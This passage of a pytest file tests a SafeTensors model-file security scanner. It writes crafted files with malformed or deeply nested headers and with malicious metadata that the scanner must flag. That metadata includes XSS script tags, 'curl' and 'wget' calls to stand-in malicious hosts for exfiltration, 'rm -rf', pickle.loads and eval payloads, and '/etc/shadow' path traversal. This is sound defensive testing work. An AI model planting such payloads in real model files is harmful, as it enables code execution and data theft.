    assert direct.has_errors is False
    assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "safetensors_header_validation_failed" in direct.metadata["scan_outcome_reasons"]
    assert any(check.name == "SafeTensors JSON Parse" and check.status == CheckStatus.FAILED for check in direct.checks)
    assert not any(issue.severity == IssueSeverity.CRITICAL for issue in direct.issues)


def test_invalid_utf8_license_metadata_is_inconclusive(tmp_path: Path) -> None:
    file_path = tmp_path / "invalid_utf8_license_metadata.safetensors"
    write_raw_safetensors_header(
        file_path,
        b'{"__metadata__":{"license":"MIT \xff"},"t":{"dtype":"U8","shape":[1],"data_offsets":[0,1]}}',
        b"\x00",
    )

    direct = SafeTensorsScanner().scan(str(file_path))

    assert direct.success is False
    assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "safetensors_header_validation_failed" in direct.metadata["scan_outcome_reasons"]
    assert any(
        check.name == "SafeTensors JSON Parse"
        and check.status == CheckStatus.FAILED
        and check.details["exception_type"] == "UnicodeDecodeError"
        for check in direct.checks
    )


def test_duplicate_safetensors_metadata_keys_fail_closed(tmp_path: Path) -> None:
    file_path = tmp_path / "duplicate_license_metadata.safetensors"
    write_raw_safetensors_header(
        file_path,
        (
            b'{"__metadata__":{"license":"MIT","license":"https://evil.example/payload"},'
            b'"t":{"dtype":"U8","shape":[1],"data_offsets":[0,1]}}'
        ),
        b"\x00",
    )

    direct = SafeTensorsScanner().scan(str(file_path))

    assert direct.success is False
    assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "safetensors_header_validation_failed" in direct.metadata["scan_outcome_reasons"]
    assert any(
        check.name == "SafeTensors Duplicate Key Detection"
        and check.status == CheckStatus.FAILED
        and check.details["duplicate_keys"] == ["license"]
        for check in direct.checks
    )


def test_unavailable_read_is_inconclusive_not_security_finding(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    file_path = tmp_path / "unreadable.safetensors"
    write_raw_safetensors(file_path, {"t": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]}}, b"\x00")

    def raise_os_error(*_args: object, **_kwargs: object) -> None:
        raise OSError("simulated SafeTensors read failure")

    def raise_detection_error(_path: str) -> str:
        raise OSError("simulated SafeTensors detection read failure")

    def raise_zip_error(_path: str) -> bool:
        raise OSError("simulated ZIP probe read failure")

    monkeypatch.setattr("modelaudit.core.detect_file_format", raise_detection_error)
    monkeypatch.setattr("modelaudit.core.detect_file_format_from_magic", lambda _path: "unknown")
    monkeypatch.setattr("modelaudit.scanners.zipfile.is_zipfile", raise_zip_error)
    monkeypatch.setattr("modelaudit.scanners.safetensors_scanner.open", raise_os_error, raising=False)

    direct = SafeTensorsScanner().scan(str(file_path))
    aggregate = scan_model_directory_or_file(str(file_path), cache_scan_results=False)

    read_checks = [check for check in direct.checks if check.name == "SafeTensors File Read"]
    assert direct.success is False
    assert aggregate.success is False
    assert len(read_checks) == 1
    assert read_checks[0].status == CheckStatus.FAILED
    assert "Unable to read SafeTensors file" in read_checks[0].message
    assert read_checks[0].severity == IssueSeverity.INFO
    assert read_checks[0].details["analysis_incomplete"] is True
    assert read_checks[0].details["scan_outcome_reason"] == SAFETENSORS_READ_INCONCLUSIVE_REASON
    assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert SAFETENSORS_READ_INCONCLUSIVE_REASON in direct.metadata["scan_outcome_reasons"]
    assert direct.metadata["operational_error_reason"] == SAFETENSORS_READ_INCONCLUSIVE_REASON
    metadata = aggregate.file_metadata[str(file_path)]
    assert SAFETENSORS_READ_INCONCLUSIVE_REASON in metadata["scan_outcome_reasons"]
    assert metadata["operational_error_reason"] == SAFETENSORS_READ_INCONCLUSIVE_REASON
    assert any(
        check.name == "SafeTensors File Read" and "Unable to read SafeTensors file" in check.message
        for check in aggregate.checks
    )
    assert not [
        issue for issue in aggregate.issues if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
    ]
    assert determine_exit_code(aggregate) == 2


def test_unreadable_path_preflight_is_operational_not_security_finding(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    file_path = tmp_path / "permission-denied.safetensors"
    write_raw_safetensors(file_path, {"t": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]}}, b"\x00")

    monkeypatch.setattr("modelaudit.scanners.base.os.access", lambda _path, _mode: False)

    direct = SafeTensorsScanner().scan(str(file_path))
    aggregate = scan_model_directory_or_file(str(file_path), cache_scan_results=False)

    assert direct.metadata["scan_outcome_reasons"] == [SAFETENSORS_READ_INCONCLUSIVE_REASON]
    assert direct.metadata["operational_error_reason"] == SAFETENSORS_READ_INCONCLUSIVE_REASON
    assert aggregate.file_metadata[str(file_path)]["operational_error_reason"] == SAFETENSORS_READ_INCONCLUSIVE_REASON
    assert not [
        issue for issue in aggregate.issues if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
    ]
    assert determine_exit_code(aggregate) == 2


def test_bad_offsets(tmp_path: Path) -> None:
    file_path = tmp_path / "model.safetensors"
    create_safetensors_file(file_path)

    bad_path = tmp_path / "bad_offsets.safetensors"
    with open(file_path, "rb") as f:
        header_len = struct.unpack("<Q", f.read(8))[0]
        header_bytes = f.read(header_len)
        rest = f.read()

    header = json.loads(header_bytes.decode("utf-8"))
    first = next(k for k in header if k != "__metadata__")
    header[first]["data_offsets"] = [0, 2]  # incorrect
    new_header_bytes = json.dumps(header).encode("utf-8")
    new_len = struct.pack("<Q", len(new_header_bytes))
    bad_path.write_bytes(new_len + new_header_bytes + rest)

    scanner = SafeTensorsScanner()
    result = scanner.scan(str(bad_path))

    assert result.has_errors
    assert any("offset" in issue.message.lower() for issue in result.issues)


def test_unclaimed_safetensors_data_is_inconclusive_not_clean(tmp_path: Path) -> None:
    file_path = tmp_path / "trailing.safetensors"
    header = {"t": {"dtype": "F32", "shape": [1], "data_offsets": [0, 4]}}
    write_raw_safetensors(file_path, header, b"\x00" * 8)

    scanner = SafeTensorsScanner()
    result = scanner.scan(str(file_path))

    assert result.success is False
    assert result.has_errors is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "safetensors_structure_validation_failed" in result.metadata["scan_outcome_reasons"]
    assert not any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
    assert any(
        check.name == "Tensor Data Coverage Check" and check.status == CheckStatus.FAILED for check in result.checks
    )


def test_unclaimed_safetensors_data_returns_exit2(tmp_path: Path) -> None:
    file_path = tmp_path / "trailing.safetensors"
    header = {"t": {"dtype": "F32", "shape": [1], "data_offsets": [0, 4]}}
    write_raw_safetensors(file_path, header, b"\x00" * 8)

    result = scan_model_directory_or_file(str(file_path))

    assert determine_exit_code(result) == 2
    assert not any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)


def test_malformed_data_offsets_are_inconclusive_not_scanner_crash(tmp_path: Path) -> None:
    file_path = tmp_path / "bad_offsets_shape.safetensors"
    header = {"t": {"dtype": "F32", "shape": [1], "data_offsets": [0, 4, 8]}}
    write_raw_safetensors(file_path, header, b"\x00" * 8)

    scanner = SafeTensorsScanner()
    result = scanner.scan(str(file_path))

    assert result.success is False
    assert result.has_errors is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "safetensors_structure_validation_failed" in result.metadata["scan_outcome_reasons"]
    assert any(
        check.name == "Tensor Offset Structure Validation" and check.status == CheckStatus.FAILED
        for check in result.checks
    )
    assert not any("Error scanning SafeTensors file" in issue.message for issue in result.issues)


def test_safetensors_security_finding_takes_precedence_over_inconclusive_structure(tmp_path: Path) -> None:
    file_path = tmp_path / "malicious_metadata_trailing.safetensors"
    header = {
        "__metadata__": {"description": "<script>alert('xss')</script>"},
        "t": {"dtype": "F32", "shape": [1], "data_offsets": [0, 4]},
    }
    write_raw_safetensors(file_path, header, b"\x00" * 8)

    direct = SafeTensorsScanner().scan(str(file_path))
    aggregate = scan_model_directory_or_file(str(file_path))

    assert direct.has_errors is True
    assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in direct.issues)
    assert determine_exit_code(aggregate) == 1


def test_safetensors_with_torch7_like_metadata_keeps_safetensors_routing(tmp_path: Path) -> None:
    file_path = tmp_path / "torch-marker-metadata.safetensors"
    header = {
        "__metadata__": {
            "framework": "torch",
            "kind": "tensor nn.Sequential",
            "description": "<script>alert('xss')</script>",
        },
        "t": {"dtype": "F32", "shape": [1], "data_offsets": [0, 4]},
    }
    write_raw_safetensors(file_path, header, b"\x00" * 4)

    direct = scan_file(str(file_path))
    aggregate = scan_model_directory_or_file(str(file_path))

    assert direct.scanner_name == "safetensors"
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in direct.issues)
    assert determine_exit_code(aggregate) == 1


def test_zlib_shaped_header_keeps_safetensors_security_routing(tmp_path: Path) -> None:
    file_path = tmp_path / "zlib-shaped-header.unknown"
    header_len = 0x9C78
    header = json.dumps(
        {
            "__metadata__": {"description": "<script>alert('xss')</script>"},
            "tensor": {
                "dtype": "U8",
                "shape": [1],
                "data_offsets": [0, 1],
            },
        },
        separators=(",", ":"),
    ).encode("utf-8")
    write_raw_safetensors_header(file_path, header + b" " * (header_len - len(header)), b"\x00")

    result = scan_file(str(file_path))

    assert file_path.read_bytes()[:2] == b"\x78\x9c"
    assert result.scanner_name == "safetensors"
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)


def test_zlib_shaped_deep_header_fails_closed(tmp_path: Path) -> None:
    file_path = tmp_path / "deep-zlib-shaped.unknown"
    header_len = 0x9C78
    depth = 10_000
    header = b'{"a":' + (b"[" * depth) + b"0" + (b"]" * depth) + b"}"
    write_raw_safetensors_header(file_path, header + b" " * (header_len - len(header)), b"\x00")

    cache_dir = tmp_path / "cache"
    config = {
        "cache_enabled": True,
        "cache_dir": str(cache_dir),
        "min_cache_file_size": 0,
    }

    reset_cache_manager()
    try:
        result = scan_file(str(file_path), config=config)
        repeated_result = scan_file(str(file_path), config=config)
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()

    aggregate = scan_model_directory_or_file(str(file_path), cache_scan_results=False)

    parse_check = next(check for check in result.checks if check.name == "SafeTensors JSON Parse")
    assert file_path.read_bytes()[:2] == b"\x78\x9c"
    assert result.scanner_name == "safetensors"
    assert result.success is False
    assert repeated_result.success is False
    assert parse_check.status == CheckStatus.FAILED
    assert parse_check.details["exception_type"] == "RecursionError"
    assert "maximum recursion depth exceeded" in parse_check.message
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert determine_exit_code(aggregate) == 2


@pytest.mark.parametrize(
    ("dtype", "expected_size"),
    [
        ("BOOL", 4),
        ("BF16", 8),
        ("C64", 32),
        ("F4", 2),
        ("F6_E2M3", 3),
        ("F6_E3M2", 3),
        ("F8_E4M3", 4),
        ("F8_E4M3FNUZ", 4),
        ("F8_E5M2", 4),
        ("F8_E5M2FNUZ", 4),
        ("F8_E8M0", 4),
        ("F16", 8),
        ("F32", 16),
        ("F64", 32),
    ],
)
def test_tensor_size_check_runs_for_supported_dtypes(tmp_path: Path, dtype: str, expected_size: int) -> None:
    file_path = tmp_path / f"mismatch_{dtype}.safetensors"
    create_safetensors_with_dtype_size_mismatch(file_path, dtype)

    direct = scan_file(str(file_path))
    aggregate = scan_model_directory_or_file(str(file_path))

    size_checks = [
        check
        for check in direct.checks
        if check.name == "Tensor Size Consistency Check" and check.details.get("tensor") == "tensor"
    ]
    assert direct.scanner_name == "safetensors"
    assert direct.has_errors is True
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in direct.issues)
    assert size_checks, f"Expected Tensor Size Consistency Check for dtype {dtype}"
    assert any(
        check.status == CheckStatus.FAILED and check.details.get("expected_size") == expected_size
        for check in size_checks
    ), f"Expected failing size consistency check for dtype {dtype}"
    assert determine_exit_code(aggregate) == 1


@pytest.mark.parametrize("dtype", ["F4", "F6_E2M3", "F6_E3M2"])
def test_subbyte_dtype_requires_byte_aligned_tensor(tmp_path: Path, dtype: str) -> None:
    file_path = tmp_path / f"misaligned-{dtype}.safetensors"
    write_raw_safetensors(
        file_path,
        {"tensor": {"dtype": dtype, "shape": [1], "data_offsets": [0, 1]}},
        b"\x00",
    )

    direct = scan_file(str(file_path))
    aggregate = scan_model_directory_or_file(str(file_path))

    assert direct.scanner_name == "safetensors"
    assert direct.success is False
    assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert any(
        check.name == "Tensor Size Computation Check" and check.status == CheckStatus.FAILED for check in direct.checks
    )
    assert determine_exit_code(aggregate) == 2


def test_deeply_nested_header(tmp_path: Path) -> None:
    """Ensure deeply nested headers are handled gracefully."""
    import sys

    # Create a deeply nested structure that will definitely trigger RecursionError
    # Use a much larger depth to ensure we exceed recursion limits across Python versions
    # Some Python versions/implementations have higher limits or optimizations
    base_limit = sys.getrecursionlimit()
    depth = max(base_limit * 2, 3000)  # Use at least 3000 or 2x the limit

    # Build the deeply nested JSON string manually
    header_str = '{"a":' * depth + "{}" + "}" * depth
    header_bytes = header_str.encode("utf-8")

    file_path = tmp_path / "deep.safetensors"
    with open(file_path, "wb") as f:
        f.write(struct.pack("<Q", len(header_bytes)))
        f.write(header_bytes)
        f.write(b"\x00")

    scanner = SafeTensorsScanner()
    result = scanner.scan(str(file_path))

    assert result.has_errors or result.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
    # Check that either RecursionError was caught OR the header was marked as invalid/deeply nested
    # Also check for generic JSON error since deeply nested JSON might fail differently
    # Include tensor validation errors as acceptable since deeply nested but valid JSON
    # will parse successfully but create invalid SafeTensors structure
    assert any(
        (check.details and check.details.get("exception_type") == "RecursionError")
        or "deeply nested" in check.message.lower()
        or "recursion" in check.message.lower()
        or "invalid json" in check.message.lower()
        or "offsets out of bounds" in check.message.lower()  # Acceptable for this test
        or "invalid data_offsets structure" in check.message.lower()
        for check in result.checks
    )


def test_suspicious_metadata(tmp_path: Path) -> None:
    file_path = tmp_path / "model.safetensors"
    data = {"t": np.arange(5, dtype=np.float32)}
    metadata = {"info": "wget http://malicious"}
    save_file(data, str(file_path), metadata=metadata)

    scanner = SafeTensorsScanner()
    result = scanner.scan(str(file_path))

    assert any("suspicious metadata" in issue.message.lower() for issue in result.issues)
    assert "suspicious_pattern" in result.metadata["custom_metadata_security_flags"]


def test_unicode_metadata_is_not_code_injection(tmp_path: Path) -> None:
    file_path = tmp_path / "unicode_metadata.safetensors"
    data = {"t": np.arange(5, dtype=np.float32)}
    metadata = {"description": "café model trained on multilingual text 日本語"}
    save_file(data, str(file_path), metadata=metadata)

    scanner = SafeTensorsScanner()
    result = scanner.scan(str(file_path))

    code_injection_checks = [check for check in result.checks if check.name == "SafeTensors Code Injection Detection"]
    assert code_injection_checks == []
    assert result.metadata["custom_metadata_security_flags"] == []
    assert [issue for issue in result.issues if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}] == []


@pytest.mark.parametrize(
    "value",
    [
        "configuration=enabled",
        "versioning=enabled",
        "<div online=true>",
        "<span only=one>",
        "encoded with base64.urlsafe_b64encode",
        "serialized with pickle.dumps for documentation",
        "serialized with marshal.dumps for documentation",
    ],
)
def test_benign_metadata_references_are_not_injection_patterns(tmp_path: Path, value: str) -> None:
    file_path = tmp_path / "benign_reference_metadata.safetensors"
    write_raw_safetensors(
        file_path,
        {
            "t": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": {"description": value},
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))

    assert result.success is True
    assert result.metadata["custom_metadata_security_flags"] == []
    assert not [
        check
        for check in result.checks
        if check.name in {"SafeTensors XSS/HTML Injection Detection", "SafeTensors Code Injection Detection"}
        and check.status == CheckStatus.FAILED
    ]


@pytest.mark.parametrize(
    "value",
    [
        "<script src=https://evil.example/payload.js>",
        "<div onclick=alert(1)>",
        "<body onload=run()>",
        "onclick=alert(1)",
        "onload = run()",
    ],
)
def test_open_html_injection_flags_xss(tmp_path: Path, value: str) -> None:
    file_path = tmp_path / "open_script_metadata.safetensors"
    write_raw_safetensors(
        file_path,
        {
            "t": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": {"description": value},
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))

    assert result.success is False
    assert "xss_html_injection" in result.metadata["custom_metadata_security_flags"]
    assert any(
        check.name == "SafeTensors XSS/HTML Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


@pytest.mark.parametrize(
    "value",
    [
        "base64.b64decode(payload)",
        "pickle.loads(payload)",
        "marshal.loads(payload)",
    ],
)
def test_executable_decoder_and_loader_calls_flag_code_injection(tmp_path: Path, value: str) -> None:
    file_path = tmp_path / "executable_loader_metadata.safetensors"
    write_raw_safetensors(
        file_path,
        {
            "t": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": {"payload": value},
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))

    assert result.success is False
    assert "code_injection" in result.metadata["custom_metadata_security_flags"]
    assert any(
        check.name == "SafeTensors Code Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_literal_unicode_escape_metadata_still_flags_code_injection(tmp_path: Path) -> None:
    file_path = tmp_path / "escaped_payload_metadata.safetensors"
    data = {"t": np.arange(5, dtype=np.float32)}
    metadata = {"payload": r"\u0065\u0076\u0061\u006c\u0028"}
    save_file(data, str(file_path), metadata=metadata)

    scanner = SafeTensorsScanner()
    result = scanner.scan(str(file_path))

    code_injection_checks = [check for check in result.checks if check.name == "SafeTensors Code Injection Detection"]
    assert code_injection_checks
    assert all(check.severity == IssueSeverity.CRITICAL for check in code_injection_checks)
    assert "code_injection" in result.metadata["custom_metadata_security_flags"]


def test_single_comment_token_does_not_bypass_unicode_escape_detection(tmp_path: Path) -> None:
    file_path = tmp_path / "commented_escape_payload_metadata.safetensors"
    data = {"t": np.arange(5, dtype=np.float32)}
    metadata = {"payload": r"\u0065#\u0076\u0061\u006c\u0028"}
    save_file(data, str(file_path), metadata=metadata)

    scanner = SafeTensorsScanner()
    result = scanner.scan(str(file_path))

    code_injection_checks = [check for check in result.checks if check.name == "SafeTensors Code Injection Detection"]
    assert code_injection_checks
    assert all(check.severity == IssueSeverity.CRITICAL for check in code_injection_checks)


def test_safetensors_benign_path_like_metadata_not_flagged(tmp_path: Path) -> None:
    """Benign path references in metadata should not be treated as traversal."""
    file_path = tmp_path / "benign_metadata.safetensors"
    data = {"t": np.arange(5, dtype=np.float32)}
    metadata = {
        "source_path": "/home/alice/model-cache/run-1",
        "root_copy": "/root/.cache/model.bin",
        "win_path": r"C:\Users\alice\models\weights.safetensors",
        "encoded_path": "%2Fhome%2Falice%2Fworkspace%2Fmodel.bin",
    }
    save_file(data, str(file_path), metadata=metadata)

    result = SafeTensorsScanner().scan(str(file_path))

    assert not [
        check
        for check in result.checks
        if check.name == "SafeTensors Path Traversal Detection" and check.status == CheckStatus.FAILED
    ]
    assert not [
        check
        for check in result.checks
        if check.name == "Metadata Code Pattern Check" and check.status == CheckStatus.FAILED
    ]


def test_safetensors_traversal_metadata_still_detected(tmp_path: Path) -> None:
    """Relative and URL-encoded traversal metadata should still be reported."""
    file_path = tmp_path / "traversal_metadata.safetensors"
    data = {"t": np.arange(5, dtype=np.float32)}
    metadata = {
        "payload_path": "../tmp/../../payload.bin",
        "encoded_payload": "%2E%2e/%2e%2e/etc/shadow",
    }
    save_file(data, str(file_path), metadata=metadata)

    result = SafeTensorsScanner().scan(str(file_path))

    traversal_checks = [
        check
        for check in result.checks
        if check.name == "SafeTensors Path Traversal Detection" and check.status == CheckStatus.FAILED
    ]
    assert traversal_checks
    assert any((check.details or {}).get("attack_type") == "path_traversal" for check in traversal_checks)


def test_metadata_windows_drive_path_no_code_pattern_false_positive(tmp_path: Path) -> None:
    """Windows path separators alone should not trip the metadata code-pattern check."""
    file_path = tmp_path / "windows_path_only.safetensors"
    data = {"t": np.arange(5, dtype=np.float32)}
    metadata = {"artifact": r"D:\models\artifact\run.bin"}
    save_file(data, str(file_path), metadata=metadata)

    result = SafeTensorsScanner().scan(str(file_path))

    assert not [
        check
        for check in result.checks
        if check.name == "Metadata Code Pattern Check" and check.status == CheckStatus.FAILED
    ]


def test_mixed_suspicious_patterns(tmp_path: Path) -> None:
    """Test that both simple patterns and regex patterns are detected from the same metadata value."""
    file_path = tmp_path / "model.safetensors"
    data = {"t": np.arange(5, dtype=np.float32)}

    # Metadata containing both simple pattern (import) and regex pattern (URL)
    metadata = {"malicious_code": "import os; os.system('curl https://malicious.example.com/exfiltrate')"}
    save_file(data, str(file_path), metadata=metadata)

    scanner = SafeTensorsScanner()
    result = scanner.scan(str(file_path))

    # Should detect BOTH the import pattern AND the URL pattern
    suspicious_issues = [issue for issue in result.issues if "suspicious metadata" in issue.message.lower()]

    # Should have detected at least 2 issues: one for import, one for URL
    assert len(suspicious_issues) >= 2, (
        f"Expected at least 2 suspicious patterns detected, got {len(suspicious_issues)}"
    )

    # Verify that different types of issues are detected
    issue_messages = [issue.why for issue in suspicious_issues if issue.why]

    # Should have both simple pattern detection and regex pattern detection
    has_code_pattern = any("code-like patterns" in msg for msg in issue_messages)
    has_regex_pattern = any("suspicious pattern" in msg for msg in issue_messages)

    assert has_code_pattern, "Should detect import statement as code-like pattern"
    assert has_regex_pattern, "Should detect URL as regex-based suspicious pattern"


def test_multiple_distinct_patterns(tmp_path: Path) -> None:
    """Test detection of multiple different types of suspicious patterns."""
    file_path = tmp_path / "model.safetensors"
    data = {"t": np.arange(5, dtype=np.float32)}

    # Multiple metadata fields with different suspicious patterns
    metadata = {
        "setup": "rm -rf /tmp/test",  # Shell command (regex pattern)
        "code": "import subprocess",  # Import statement (simple pattern)
        "callback": "https://evil.com/exfiltrate",  # URL (regex pattern)
        "script": "<script>alert('xss')</script>",  # Script injection (regex pattern)
    }
    save_file(data, str(file_path), metadata=metadata)

    scanner = SafeTensorsScanner()
    result = scanner.scan(str(file_path))

    suspicious_issues = [issue for issue in result.issues if "suspicious metadata" in issue.message.lower()]

    # Should detect issues for each metadata field
    assert len(suspicious_issues) >= 4, (
        f"Expected at least 4 suspicious patterns detected, got {len(suspicious_issues)}"
    )

    # Check that different metadata keys are flagged
    flagged_keys = set()
    for issue in suspicious_issues:
        # Extract key name from message like "Suspicious metadata value for setup"
        if "for " in issue.message:
            key = issue.message.split("for ")[-1]
            flagged_keys.add(key)

    expected_keys = {"setup", "code", "callback", "script"}
    assert flagged_keys.issuperset(expected_keys), (
        f"Expected all keys {expected_keys} to be flagged, got {flagged_keys}"
    )
